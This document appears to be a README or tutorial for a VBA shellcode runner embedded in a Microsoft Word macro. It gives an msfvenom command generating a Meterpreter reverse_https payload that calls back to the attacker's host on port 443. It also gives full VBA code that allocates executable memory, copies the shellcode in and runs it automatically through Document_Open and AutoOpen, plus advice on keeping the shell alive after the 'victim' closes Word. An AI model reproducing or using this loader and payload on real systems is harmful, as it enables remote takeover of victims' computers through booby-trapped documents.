# VBA-Shellcode-Runner:

Calling Win32 APIs from VBA:

Windows operating system APIs (or Win32 APIs) are located in dynamic link libraries and run as unmanaged code. We'll use the Declare keyword to link to these APIs in VBA, providing the name of the function, the DLL it resides in, the argument types, and return value types. We will use a Private Declare, meaning that this function will only be used in our local code.
The typical approach is to use three Win32 APIs from Kernel32.dll: VirtualAlloc, RtlMoveMemory, and CreateThread. For function prototype we can refer https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex


We will use VirtualAlloc to allocate unmanaged memory that is writable, readable, and executable. We'll then copy the shellcode into the newly allocated memory with RtlMoveMemory, and create a new execution thread in the process through CreateThread to execute the shellcode. 

Allocating memory through other Win32 APIs returns non-executable memory due to the memory protection called Data Execution Prevention (DEP)

In order to generate the shellcode, we need to know the target architecture. Obviously we are targeting a 64-bit Windows machine, but Microsoft Word 2016 installs as 32-bit by default, so we will generate 32-bit shellcode. 

Also set sslversion TLS1.2 to handle https payload

    msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f vbapplication 
  
  (Since we will be executing our shellcode inside the Word application, we specify the EXITFUNC with a value of "thread" instead of the default value of "process" to avoid closing Microsoft Word when the shellcode exits.)


In summary, we begin by declaring functions for the three Win32 APIs. Then we declare five variables, including a variable for our Meterpreter array and use VirtualAlloc to create some space for our shellcode. Next, we use RtlMoveMemory to put our code in memory with the help of a For loop. Finally, we use CreateThread to execute our shellcode. When executed, our shellcode runner calls back to the Meterpreter listener and opens the reverse shell as expected, entirely in memory.

To work as expected, this requires a matching 32-bit multi/handler in Metasploit with the EXITFUNC set to "thread" and matching IP and port number.

the primary disadvantage is that when the victim closes Word, our shell will die. so we need to incorporate Process Injection/Migration techniques. Metasploit's AutoMigrate module solves this. 

Code: 
        
        Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
        
        Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
        
        Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
        
        Function MyMacro()
            Dim buf As Variant
            Dim addr As LongPtr
            Dim counter As Long
            Dim data As Long
            Dim res As Long
            
            buf = Array(252, 232, 143, 0, 0, 0, 96, .......<generated shell code> )
        
            addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
            
            For counter = LBound(buf) To UBound(buf)
                data = buf(counter)
                res = RtlMoveMemory(addr + counter, data, 1)
            Next counter
            
            res = CreateThread(0, 0, addr, 0, 0, 0)
        End Function
        
        Sub Document_Open()
            MyMacro
        End Sub
        
        Sub AutoOpen()
            MyMacro
        End Sub
        

